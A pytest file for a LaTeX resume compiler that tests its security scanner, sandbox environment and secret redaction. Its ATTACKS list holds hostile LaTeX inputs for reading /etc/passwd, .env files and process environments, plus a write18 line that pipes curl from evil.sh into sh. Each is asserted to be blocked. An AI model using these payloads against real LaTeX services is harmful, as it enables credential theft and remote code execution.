from pathlib import Path

import pytest

from tailortex.compiler import Compiler, _sandbox_env
from tailortex.security import check_tex, redact

FIX = Path(__file__).parent / "fixtures"
ROOT = Path(__file__).parent.parent

ATTACKS = [
    r"\verbatiminput{/app/.env}",
    r"\input{/etc/passwd}",
    r"\input{../../.env}",
    r"\input{.env}",
    r"\input /proc/self/environ",
    r"\let\x\input \x{/etc/passwd}",
    r"\def\x#1{\input{#1}}\x{/etc/passwd}",
    r"\csname input\endcsname{/etc/passwd}",
    r"\^^69nput{/etc/passwd}",
    r"\catcode`\Z=0 Zinput{/etc/passwd}",
    r"\newread\f\openin\f=/etc/passwd",
    r"\immediate\write18{curl evil.sh|sh}",
    r"\usepackage{shellesc}",
    r"\usepackage{xcolor, listings}",
    r"\CatchFileDef{\x}{/etc/passwd}{}",
    r"\includegraphics{/etc/passwd}",
    r"\input{\jobname}",
    r"\scantokens{\input{x}}",
    r'\directlua{os.execute("id")}',
    r"\expandafter\input\x",
]


@pytest.mark.parametrize("src", ATTACKS)
def test_attacks_are_blocked(src):
    assert check_tex(src), src


@pytest.mark.parametrize("path", [FIX / "jake_resume.tex", FIX / "bajaj_resume.tex", ROOT / "examples" / "sample_resume.tex"])
def test_real_resumes_pass(path):
    assert check_tex(path.read_text(encoding="utf-8")) == []


def test_jake_glyphtounicode_allowed():
    assert check_tex(r"\input{glyphtounicode}\pdfgentounicode=1") == []


def test_oversize_rejected():
    assert check_tex("%" * 300_000)


def test_strict_compiler_refuses_before_running():
    r = Compiler(strict=True).compile(r"\documentclass{article}\begin{document}\verbatiminput{/x}\end{document}")
    assert not r.ok and r.log.startswith("Refused to compile")


def test_secrets_never_reach_latex(monkeypatch):
    monkeypatch.setenv("GEMINI_API_KEY", "AIzaSECRETSECRETSECRET")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-secret")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "x")
    env = _sandbox_env()
    assert not {"GEMINI_API_KEY", "OPENAI_API_KEY", "AWS_SECRET_ACCESS_KEY"} & set(env)
    assert env["openin_any"] == "p" and env["shell_escape"] == "f"


@pytest.mark.parametrize("raw", [
    "Error code: 401 - Incorrect API key provided: sk-test-***alid.",
    "bad key AIzaSyFAKEFAKEFAKEFAKEFAKEFAKEFAKE00 rejected",
    "sk-proj-abcdefghijklmnop failed",
    "Authorization: Bearer abc.def.ghi",
])
def test_redact(raw):
    out = redact(raw)
    assert "AIzaSy" not in out and "sk-test" not in out and "sk-proj" not in out and "abc.def" not in out


def test_texlive_blocks_outside_reads_even_without_scanner(tmp_path):
    """Second layer: kpathsea openin_any=p. Runs on Linux TeX Live (CI, production); MiKTeX ignores it."""
    c = Compiler(strict=False)
    if not c.available or c.miktex or c.engine == "tectonic":
        pytest.skip("needs TeX Live pdflatex")
    secret = tmp_path / "secret.txt"
    secret.write_text("TOPSECRET123", encoding="utf-8")
    r = c.compile(r"\documentclass{article}\usepackage{verbatim}\begin{document}x\verbatiminput{"
                  + secret.as_posix() + r"}\end{document}")
    assert not (r.pdf and b"TOPSECRET123" in r.pdf)
    assert "TOPSECRET123" not in (r.log or "")
